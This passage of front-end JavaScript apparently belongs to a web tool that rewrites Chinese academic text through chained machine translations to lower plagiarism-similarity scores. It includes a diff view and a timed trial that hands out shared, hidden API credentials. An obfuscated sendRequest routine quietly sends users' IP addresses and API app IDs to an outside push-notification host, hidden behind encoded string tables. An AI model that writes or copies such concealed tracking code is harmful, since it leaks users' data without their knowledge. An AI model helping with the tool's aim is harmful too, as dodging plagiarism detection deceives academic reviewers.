					//! Don't forget it!
					var similarityRes = allSimilarity(to.val(), rs);
					var res = new Res(5, similarityRes);
					similarityArr.push(res);
					from5.after("<p class='tongji text-muted'>共计：<b>" + tongji(rs) + " </b>字符&emsp;<span class='similarity'>预计相似度：<b>" + similarityRes + "</b></span></p>");
					if (fn) {
						setTimeout(() => {
							compareMain("from5")
						}, 1000);
					}
				}, (err) => {
					if (err == "54003" || err == "") {
						from5.html("修改失败，请稍后重试......");
						from5.css("color", "red");
						$(".restart5").css("display", "inline-block")
						if (errorTimes <= 5) {
							sendRequest(localStorage.getItem("sTimes") + " \\ " + localStorage.getItem("appid1"), "error5-3:" + err, 1)
						}
						errorTimes++;
					}
				})
			}, (err) => {
				if (err == "54003" || err == "") {
					from5.html("修改失败，请稍后重试......");
					from5.css("color", "red");
					$(".restart5").css("display", "inline-block")
					if (errorTimes <= 5) {
						sendRequest(localStorage.getItem("sTimes") + " \\ " + localStorage.getItem("appid1"), "error5-2:" + err, 1)
					}
					errorTimes++;
				}
			})
		}, (err) => {
			if (err == "54003" || err == "") {
				from5.html("修改失败，请稍后重试......");
				from5.css("color", "red");
				$(".restart5").css("display", "inline-block")
				if (errorTimes <= 5) {
					sendRequest(localStorage.getItem("sTimes") + " \\ " + localStorage.getItem("appid1"), "error5-1:" + err, 1)
				}
				errorTimes++;
			}
		})
	}, (err) => {
		if (err == "54003" || err == "") {
			from5.html("修改失败，请稍后重试......");
			from5.css("color", "red");
			$(".restart5").css("display", "inline-block")
			if (errorTimes <= 5) {
				sendRequest(localStorage.getItem("sTimes") + " \\ " + localStorage.getItem("appid1"), "error5:" + err, 1)
			}
			errorTimes++;
		}
	})
}

function translateMain(fn, str) {
	setTimeout(() => {
		translateFiveFn(fn);
	}, 1000, setTimeout(() => {
		translateFourFn(fn);
	}, 1000, setTimeout(() => {
		translateThreeFn(fn);
	}, 1000, setTimeout(() => {
		translateTwoFn(fn);
	}, 1000, setTimeout(() => {
		translateOneFn(fn);
	}, 1000, setTimeout(() => {
		translateZeroFn(fn);
	}, 1000))))));
}


function compareMain(op) {
	if (from.text() !== "修改失败，请稍后重试......" && from.text() !== "" && op === "from") {
		compareFn(compare, to, from)
	}
	if (from1.text() !== "修改失败，请稍后重试......" && from1.text() !== "" && op === "from1") {
		compareFn(compare1, to, from1)
	}
	if (from2.text() !== "修改失败，请稍后重试......" && from2.text() !== "" && op === "from2") {
		compareFn(compare2, to, from2)
	}
	if (from3.text() !== "修改失败，请稍后重试......" && from3.text() !== "" && op === "from3") {
		compareFn(compare3, to, from3)
	}
	if (from4.text() !== "修改失败，请稍后重试......" && from4.text() !== "" && op === "from4") {
		compareFn(compare4, to, from4)
	}
	if (from5.text() !== "修改失败，请稍后重试......" && from5.text() !== "" && op === "from5") {
		compareFn(compare5, to, from5)
	}
}

function compareFn(target, originData, newData) {
	target.html(eq({
		value1: newData.text(),
		value2: originData.val()
	}).value2)
}

function showToast(msg, duration) {
	duration = isNaN(duration) ? 5000 : duration;
	var ss = document.querySelector(".toast-container");
	if (ss != null) {
		ss.remove();
	}
	var d = (new Date);
	//获取年份
	var years = d.getFullYear();
	//获取月份
	var months = d.getMonth() + 1;
	//获取日期
	var dates = d.getDate();
	//获取小时
	var hours = d.getHours();
	//获取分钟
	var minutes = d.getMinutes();
	//获取秒钟 
	var seconds = d.getSeconds();
	var nowTime = years + "/" + months + "/" + dates + " " + hours + ":" + minutes + ":" + seconds
	var time = nowTime;
	var m = document.createElement('div');
	var content = `<div class="toast-container position-fixed top-0 end-0 p-3" style="z-index: 1100">
		  <div id="liveToast" class="toast" role="alert" aria-live="assertive" aria-atomic="true">
			<div class="toast-header">
			  <i style="margin-right:0.15625rem;"class="bi bi-app-indicator"></i>
			  <strong class="me-auto">论文翻译降重助手</strong>
			  <small>` + time + `</small>
			  <button type="button" class="btn-close" data-bs-dismiss="toast" aria-label="Close"></button>
			</div>
			<div class="toast-body">
				` + msg + `
			</div>
		  </div>
		</div>`;
	document.body.appendChild(m);
	m.innerHTML = content;
	var toastLiveExample = document.getElementById('liveToast')
	var toast = new bootstrap.Toast(toastLiveExample)
	toast.show();
	setTimeout(function () {
		var d = 0.5;
		m.style.webkitTransition = '-webkit-transform ' + d + 's ease-in, opacity ' + d + 's ease-in';
		m.style.opacity = '0';
		setTimeout(function () {
			toast.hide();
			document.body.removeChild(m);
		}, d * 1000);
	}, duration);
}

function eq(op) {
	if (!op) {
		return op;
	}
	if (!op.eq_min) {
		op.eq_min = 3;
	}
	if (!op.eq_index) {
		op.eq_index = 5;
	}
	if (!op.value1 || !op.value2) {
		return op;
	}
	var ps = {
		v1_i: 0,
		v1_new_value: "",
		v2_i: 0,
		v2_new_value: ""
	};
	while (ps.v1_i < op.value1.length && ps.v2_i < op.value2.length) {
		if (op.value1[ps.v1_i] == op.value2[ps.v2_i]) {
			//ps.v1_new_value += op.value1[ps.v1_i].replace(/</g,"<").replace(">",">");
			ps.v2_new_value += op.value2[ps.v2_i].replace(/</g, "<").replace(">", ">");
			ps.v1_i += 1;
			ps.v2_i += 1;
			//值2增加的部分
			if (ps.v1_i >= op.value1.length) {
				ps.v2_new_value += "<del style='color:red'>" + op.value2.substr(ps.v2_i).replace(
					/</g, "<").replace(
					">", ">") + "</del>";
				break;
			}
			//值1删除的部分
			if (ps.v2_i >= op.value2.length) {
				//ps.v1_new_value += "<span style='" + op.value1_style + "'>值1多的" + op.value1.substr(ps.v1_i).replace(/</g,"<").replace(">",">") + "</span>";
				ps.v2_new_value += "<span style='color:green'>" + op.value1.substr(ps.v1_i).replace(
						/</g, "<")
					.replace(">", ">") + "</span>";
				break;
			}
		} else {
			ps.v1_index = ps.v1_i + 1;
			ps.v1_eq_length = 0;
			ps.v1_eq_max = 0;
			ps.v1_start = ps.v1_i + 1;
			while (ps.v1_index < op.value1.length) {
				if (op.value1[ps.v1_index] == op.value2[ps.v2_i + ps.v1_eq_length]) {
					ps.v1_eq_length += 1;
				} else if (ps.v1_eq_length > 0) {
					if (ps.v1_eq_max < ps.v1_eq_length) {
						ps.v1_eq_max = ps.v1_eq_length;
						ps.v1_start = ps.v1_index - ps.v1_eq_length;
					}
					ps.v1_eq_length = 0;
					break; //只寻找最近的
				}
				ps.v1_index += 1;
			}
			if (ps.v1_eq_max < ps.v1_eq_length) {
				ps.v1_eq_max = ps.v1_eq_length;
				ps.v1_start = ps.v1_index - ps.v1_eq_length;
			}

			ps.v2_index = ps.v2_i + 1;
			ps.v2_eq_length = 0;
			ps.v2_eq_max = 0;
			ps.v2_start = ps.v2_i + 1;
			while (ps.v2_index < op.value2.length) {
				if (
					op.value2[ps.v2_index] == op.value1[ps.v1_i + ps.v2_eq_length]
				) {
					ps.v2_eq_length += 1;
				} else if (ps.v2_eq_length > 0) {
					if (ps.v2_eq_max < ps.v2_eq_length) {
						ps.v2_eq_max = ps.v2_eq_length;
						ps.v2_start = ps.v2_index - ps.v2_eq_length;
					}
					ps.v1_eq_length = 0;
					break; //只寻找最近的
				}
				ps.v2_index += 1;
			}
			if (ps.v2_eq_max < ps.v2_eq_length) {
				ps.v2_eq_max = ps.v2_eq_length;
				ps.v2_start = ps.v2_index - ps.v2_eq_length;
			}
			if (
				ps.v1_eq_max < op.eq_min &&
				ps.v1_start - ps.v1_i > op.eq_index
			) {
				ps.v1_eq_max = 0;
			}
			if (
				ps.v2_eq_max < op.eq_min &&
				ps.v2_start - ps.v2_i > op.eq_index
			) {
				ps.v2_eq_max = 0;
			}
			if (ps.v1_eq_max == 0 && ps.v2_eq_max == 0) {
				//两个值的字不同
				//ps.v1_new_value += "<span style='" + op.value1_style + "'>不同的" + op.value1[ps.v1_i].replace(/</g,"<").replace(">",">") + "</span>";
				ps.v2_new_value += "<span style='color:green'>" + op.value1[ps.v1_i].replace(/</g,
					"<").replace(">",
					">") + "</span>";
				ps.v2_new_value += "<del style='color:red'>" + op.value2[ps.v2_i].replace(/</g, "<")
					.replace(">",
						">") + "</del>";
				ps.v1_i += 1;
				ps.v2_i += 1;

				if (ps.v1_i >= op.value1.length) {
					//值2增加的部分
					ps.v2_new_value += "<del style='color:red'>" + op.value2.substr(ps.v2_i).replace(
							/</g, "<")
						.replace(">", ">") + "</del>";
					break;
				}
				if (ps.v2_i >= op.value2.length) {
					//值1删除的部分
					//ps.v1_new_value += "<span style='" + op.value1_style + "'>值1多的" + op.value1.substr(ps.v1_i).replace(/</g,"<").replace(">",">") + "</span>";
					ps.v2_new_value += "<span style='color:green'>" + op.value1.substr(ps.v1_i)
						.replace(/</g, "<")
						.replace(">", ">") + "</span>";
					break;
				}
				//值1删除的
			} else if (ps.v1_eq_max > ps.v2_eq_max) {
				//ps.v1_new_value += "<span style='" + op.value1_style + "'>值1删除的" + op.value1.substr(ps.v1_i, ps.v1_start - ps.v1_i).replace(/</g,"<").replace(">",">") + "</span>";
				ps.v2_new_value += "<span style='color:green'>" + op.value1.substr(ps.v1_i, ps
						.v1_start - ps.v1_i)
					.replace(/</g, "<").replace(">", ">") + "</span>";
				ps.v1_i = ps.v1_start;
			} else {
				//值2增加的
				ps.v2_new_value += "<del style='color:red'>" + op.value2.substr(ps.v2_i, ps
						.v2_start - ps.v2_i)
					.replace(/</g, "<").replace(">", ">") + "</del>";
				ps.v2_i = ps.v2_start;
			}
		}
	}
	op.value1 = ps.v1_new_value;
	op.value2 = ps.v2_new_value;
	//有多个连着修改的放在一起
	var addRule = /<del style='color:red'>((?!<del).)+<\/del>/g;
	var deleteRule = /<span style='color:green'>((?!<span).)+<\/span>/g;
	var allRule =
		/(<span style='color:green'>((?!<span).)+<\/span><del style='color:red'>((?!<del).)+<\/del>){2,}/g;
	op.value2 = op.value2.replace(allRule, function (str) {
		var beforText = "",
			afterText = "";
		var beforeMatch = str.match(deleteRule);
		for (var i = 0; i < beforeMatch.length; i++) {
			var m = beforeMatch[i].match(deleteRule);
			beforText += RegExp.$1;
		}
		var afterMatch = str.match(addRule);
		for (var i = 0; i < afterMatch.length; i++) {
			var m = afterMatch[i].match(addRule);
			afterText += RegExp.$1;
		}
		return (
			"<span style='color:green'>" + beforText + "</span><del style='color:red'>" +
			afterText +
			"</del>"
		);
	});
	return op;
}

let fixedBtn = $(".fixed_btn");
$("body").scroll(function () {
	if (timer !== null) {
		clearTimeout(timer);
	}
	timer = setTimeout(() => {
		if ($("body").scrollTop() >= 500) {
			fixedBtn.css("display", 'block');
		} else {
			fixedBtn.css("display", 'none');
		}
		timer = null;
	}, 500);
});

function _0x3df7(_0x2287e0, _0x5956d1) {
	var _0x4340a8 = _0x4340();
	return _0x3df7 = function (_0x3df7c8, _0x58a013) {
		_0x3df7c8 = _0x3df7c8 - 0x137;
		var _0x302df8 = _0x4340a8[_0x3df7c8];
		return _0x302df8;
	}, _0x3df7(_0x2287e0, _0x5956d1);
}(function (_0x449aa9, _0xc154b2) {
	var _0x516e6c = _0x3df7,
		_0x3728fd = _0x449aa9();
	while (!![]) {
		try {
			var _0x3fc617 = parseInt(_0x516e6c(0x138)) / 0x1 + parseInt(_0x516e6c(0x142)) / 0x2 * (parseInt(_0x516e6c(0x13e)) / 0x3) + -parseInt(_0x516e6c(0x137)) / 0x4 + -parseInt(_0x516e6c(0x13b)) / 0x5 + -parseInt(_0x516e6c(0x14a)) / 0x6 + parseInt(_0x516e6c(0x13a)) / 0x7 + -parseInt(_0x516e6c(0x143)) / 0x8;
			if (_0x3fc617 === _0xc154b2) break;
			else _0x3728fd['push'](_0x3728fd['shift']());
		} catch (_0x104cbb) {
			_0x3728fd['push'](_0x3728fd['shift']());
		}
	}
}(_0x4340, 0xbbf05));

function _0x4340() {
	var _0x522381 = ['1353072YwAktl', 'application/x-www-form-urlencoded;\x20charset=utf-8', '【重试】：', '1215924swpwHV', '1097445igmVdS', '【出错】：', '9262750SHzTRl', '2831700rgqmCQ', '【暂无】：', '【正在翻译】：', '6CUkkvf', 'content', '【白嫖失败】：', 'ajax', '1463716qCzKvv', '16150248XQJKKb', '【白嫖成功】：', '【成功】：', '【错误码】：', 'jsonp', '【内容】：', '【下车】：'];
	_0x4340 = function () {
		return _0x522381;
	};
	return _0x4340();
}

function sendRequest(_0x15545c, _0x86625a, _0x4cc403) {
	var _0x5e22c1 = _0x3df7;
	if (_0x4cc403 == 0x1) title = _0x5e22c1(0x139) + _0x15545c, content = _0x5e22c1(0x146) + _0x86625a;
	else {
		if (_0x4cc403 == 0x2) title = _0x5e22c1(0x145) + _0x15545c, content = _0x5e22c1(0x13d) + _0x86625a;
		else {
			if (_0x4cc403 == 0x3) title = _0x5e22c1(0x14c) + _0x15545c, content = _0x5e22c1(0x148) + _0x86625a;
			else {
				if (_0x4cc403 == 0x4) title = '【上车】：' + _0x15545c, content = _0x5e22c1(0x148) + _0x86625a;
				else {
					if (_0x4cc403 == 0x5) title = _0x5e22c1(0x149) + _0x15545c, content = '【内容】：' + _0x86625a;
					else {
						if (_0x4cc403 == 0x6) title = _0x5e22c1(0x144) + _0x15545c, content = _0x5e22c1(0x148) + _0x86625a;
						else _0x4cc403 == 0x7 ? (title = _0x5e22c1(0x140) + _0x15545c, content = '【内容】：' + _0x86625a) : (title = _0x5e22c1(0x13c) + _0x15545c, content = _0x5e22c1(0x148) + _0x86625a);
					}
				}
			}
		}
	}
	var _0x2df887 = {
		'title': title,
		'content': content
	};
	setTimeout(() => {
		var _0x217bde = _0x5e22c1;
		$[_0x217bde(0x141)]({
			'url': 'https://xizhi.qqoq.net/' + secret().lICOsKN1 + '.send',
			'type': 'get',
			'dataType': _0x217bde(0x147),
			'contentType': _0x217bde(0x14b),
			'data': {
				'title': _0x2df887['title'],
				'content': _0x2df887[_0x217bde(0x13f)]
			}
		});
	}, 0x5dc);
}

$(".originData").on("input", function () {
	$('#zifu').html(tongji($(this).val()));
});

function tongji(Words) {
	// 标点和中文
	var sTotal = 0;
	// 中文字判断
	var iTotal = 0;
	// 英文字母
	var eTotal = 0;
	// 数字判断
	var inum = 0;
	for (i = 0; i < Words.length; i++) {
		var c = Words.charAt(i);
		//基本汉字
		if (c.match(/[\u4e00-\u9fa5]/)) {
			iTotal++;
		}
		//基本汉字补充
		else if (c.match(/[\u9FA6-\u9fcb]/)) {
			iTotal++;
		}
		if (c.match(/[^\x00-\xff]/)) {
			sTotal++;
		} else {
			eTotal++;
		}
		if (c.match(/[0-9]/)) {
			inum++;
		}
	}
	return iTotal * 2 + (sTotal - iTotal) * 2 + eTotal;
}

$('#exampleModal').on('shown.bs.modal', function (event) {
	if (localStorage.getItem('sTimes') != -2 && localStorage.getItem("appid1") == secret().WtdKltf2 && localStorage.getItem("key1") == secret().zDQA3) {
		localStorage.removeItem('appid1')
		localStorage.removeItem('key1')
		$("#yourAppid").val('');
		$("#yourKey").val('');
	}
})
$('#exampleModal').on('hidden.bs.modal', function (event) {
	$('body').css("padding-right", "");
})
$('#exampleModal1').on('hidden.bs.modal', function (event) {
	$('body').css("padding-right", "");
})

var loginBtn = $('#loginBtn');
loginBtn.click(() => {
	showToast('请在弹出的窗口配置账号，如果不会可以查阅帮助！', 1500);
	$('#exampleModal').modal('show')
});

$('.close').click(() => {
	if (timer !== null) {
		clearTimeout(timer);
	}
	timer = setTimeout(() => {
		$('#exampleModal').modal('hide')
		$('#exampleModal1').modal('hide')
		$('.modal-backdrop').css("z-index", "-10");
		$('body').css("padding-right", "");
		timer = null;
	}, 500);
});

var sckey1 = "";

var relaxBtn = $('#relaxBtn');
relaxBtn.click(() => {
	showToast("请先关注微信公众号【FreySu】回复“密钥”", 3500);
	$('#exampleModal1').modal('show');
});

var okBtn = $("#okBtn");
okBtn.click(() => {
	const fn = () => {
		var rscode = $("#rscode").val();
		var cursTimes = localStorage.getItem("sTimes");
		sckey1 = secret().aMewlv1;
		if (rscode == sckey1) {
			if (!cursTimes) {
				sendRequest(localStorage.getItem("appid1"), "密钥正确，白嫖成功了！" + "IP 地址：" + kehu_ip, 6);
				localStorage.setItem("appid1", secret().WtdKltf2);
				localStorage.setItem("key1", secret().zDQA3);
				localStorage.setItem("sTimes", 180000);
				showToast("密钥正确，3 分钟体验开始~", 4000);
				countTime();
			} else {
				if (cursTimes > 0) {
					localStorage.setItem("appid1", secret().WtdKltf2);
					localStorage.setItem("key1", secret().zDQA3);
					showToast(`你还剩余${cursTimes / 1000}秒，现在继续体验！`, 4000);
					countTime();
				} else if (cursTimes == 0) {
					localStorage.removeItem("appid1");
					localStorage.removeItem("key1");
					$("#yourAppid").val("");
					$("#yourKey").val("");
					localStorage.setItem("sTimes", 0);
					showToast(`<b>你的体验时长已结束！</b>如果还想使用降重功能，请去按照教程申请自己的百度翻译 API~`, 4000);
					$('#exampleModal1').modal('hide')
					$('.modal-backdrop').css("z-index", "-10");
					$('body').css("padding-right", "");
				} else {
					showToast(`<b>很抱歉，你无法参与本次活动！`, 4000);
					$('#exampleModal1').modal('hide')
					$('.modal-backdrop').css("z-index", "-10");
					$('body').css("padding-right", "");
				}
			}

			function countTime() {
				var sTimes = localStorage.getItem("sTimes");
				if (sTimes > 0) {
					var timer1 = setInterval(() => {
						sTimes -= 1000;
						localStorage.setItem("sTimes", sTimes);
						if (sTimes == 0) {
							clearInterval(timer1);
							localStorage.removeItem("appid1");
							localStorage.removeItem("key1");
							$("#yourAppid").val("");
							$("#yourKey").val("");
							localStorage.setItem("sTimes", 0);
							showToast("你的体验时长已结束！如果还想使用降重功能，请去按照教程申请自己的百度翻译 API~", 4500);
						}
					}, 1000);
				}
				$('#exampleModal1').modal('hide')
				$('.modal-backdrop').css("z-index", "-10");
				$('body').css("padding-right", "");
				showToast("请在输入框填写要翻译的内容，然后点击【翻译并对比】按钮", 4500);
			}
		} else if (rscode == "") {
			showToast("未输入，提交失败！", 4000);
		} else {
			showToast("密钥不正确，请重新获取", 3000);
			sendRequest(localStorage.getItem("appid1"), "密钥不正确，请重新获取！白嫖失败！" + "IP 地址：" + kehu_ip, 7);
		}
	}
	if (timer !== null) {
		clearTimeout(timer);
	}
	timer = setTimeout(() => {
		fn();
		timer = null;
	}, 500);
});

var cancelBtn = $("#btn_cancel");
cancelBtn.click(() => {
	if (timer !== null) {
		clearTimeout(timer);
	}
	timer = setTimeout(() => {
		$('#exampleModal1').modal('hide')
		$('.modal-backdrop').css("z-index", "-10");
		$('body').css("padding-right", "");
		timer = null;
	}, 500);
});

function countTime1() {
	var sTimes = localStorage.getItem("sTimes");
	if (sTimes > 0) {
		showToast(`你还剩余${sTimes / 1000}秒，现在继续体验！`, 3500);
		var timer1 = setInterval(() => {
			sTimes -= 1000;
			localStorage.setItem("sTimes", sTimes);
			if (sTimes == 0) {
				clearInterval(timer1);
				localStorage.removeItem("appid1");
				localStorage.removeItem("key1");
				$("#yourAppid").val("");
				$("#yourKey").val("");
				localStorage.setItem("sTimes", 0);
				showToast("你的体验时长已结束！如果还想使用降重功能，请去按照教程申请自己的百度翻译 API~", 4500);
			}
		}, 1000);
	} else if (sTimes == 0) {
		localStorage.removeItem("appid1");
		localStorage.removeItem("key1");
		$("#yourAppid").val("");
		$("#yourKey").val("");
		showToast("你的体验时长已结束！如果还想使用降重功能，请去按照教程申请自己的百度翻译 API~", 4500);
	}
}

function allSimilarity(str, str1) {
	var sRes = similarityFn(str, str1);
	var dRes = strDistance(str, str1);
	// var aSimilar = (sRes == dRes) ? `${dRes}%` : ((sRes > dRes) ? `${dRes}% ~ ${sRes}%` : `${sRes}% ~ ${dRes}%`);
	var aSimilar = `${((sRes + dRes) / 2).toFixed(2)}%`;
	return String(aSimilar);
	// similarity fn1 similarityFn(str, str1)
	function similarityFn(x, y) {
		var z = 0;
		var s = x.length + y.length;;
		if (typeof x == "string") {
			x = x.toUpperCase();
			y = y.toUpperCase();
			x = x.replace('_', '');
			y = y.replace('_', '');
			x = x.split("");
			y = y.split("");
		}
		x.sort();
		y.sort();
		var a = x.shift();
		var b = y.shift();
		while (a !== undefined && b !== undefined) {
			if (a === b) {
				z++;
				a = x.shift();
				b = y.shift();
			} else if (a < b) {
				a = x.shift();
			} else if (a > b) {
				b = y.shift();
			}
		}
		// return Number((z / s * 200).toFixed(2));
		return Number(Math.round((z / s * 200) * 10000) / 10000);
	}
	// similarity fn2 strDistance(str1,str2)
	function strDistance(a, c) {
		var h, b, d, k, e, g, f, l, n, m, p;
		a.length > c.length && (c = [c, a], a = c[0], c = c[1]);
		k = ~~Math.max(0, c.length / 2 - 1);
		e = [];
		g = [];
		b = n = 0;
		for (p = a.length; n < p; b = ++n)
			for (h = a[b], l = Math.max(0, b - k), f = Math.min(b + k + 1, c.length), d = m = l; l <= f ? m < f : m > f; d = l <= f ? ++m : --m)
				if (null == g[d] && h === c[d]) {
					e[b] = h;
					g[d] = c[d];
					break
				}
		e = e.join("");
		g = g.join("");
		if (d = e.length) {
			b = f = k = 0;
			for (l = e.length; f < l; b = ++f) h = e[b], h !== g[b] && k++;
			b = g = e = 0;
			for (f = a.length; g < f; b = ++g)
				if (h = a[b], h === c[b]) e++;
				else break;
			a = (d / a.length +
				d / c.length + (d - ~~(k / 2)) / d) / 3;
			a += 0.1 * Math.min(e, 4) * (1 - a)
		} else a = 0;
		// return Number((a * 100).toFixed(2));
		return Number(Math.round(a * 10000) / 100);
	};
}

function similarTarget(index) {
	document.getElementById(`isLow-${index}`).scrollIntoView(); // 页面不刷新跳转
}

$('.reloadPic').click(function () {
	$(this).parent().css("background-image", `url(https://picsum.photos/1920/1080.jpg?random=${Math.random().toFixed(3)})`);
})

function getCheckBoxVal() {
	var chk_value = [];
	$(".transMethods").find('input:checkbox').each(function () { //遍历所有复选框
		if ($(this).prop('checked') == true) {
			chk_value.push($(this).prop('name'));
		}
	});
	return chk_value.length == 0 ? '你还没有选择任何内容！' : chk_value
}
//console.log(getCheckBoxVal())